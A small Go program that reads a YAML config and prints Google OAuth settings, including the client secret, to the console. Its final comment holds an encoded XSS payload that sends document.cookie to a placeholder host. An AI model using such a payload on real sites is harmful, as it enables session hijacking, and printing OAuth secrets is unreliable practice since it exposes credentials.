package main

import (
	"fmt"

	"okapi.com/config"
)

func main() {
	cfg := config.ReadConfigFile("config/base.yml")

	// fmt.Println(cfg.APIConfig.Port)
	// fmt.Println(cfg.RepositoryConfig.Type)
	// fmt.Println(cfg.RepositoryConfig.URL)

	fmt.Println(cfg.Oauth.Google.ClientID)
	fmt.Println(cfg.Oauth.Google.ClientSecret)
	//fmt.Println(cfg.Oauth2Config.Google.Endpoint)
	fmt.Println(cfg.Oauth.Google.RedirectURL)
	fmt.Println(cfg.Oauth.Google.Scopes)
	//"http://127.0.0.1/?name=&#60;script&#62;document.location.href='http://www.xxx.com/cookie?'+document.cookie&#60;/script&#62;"
}
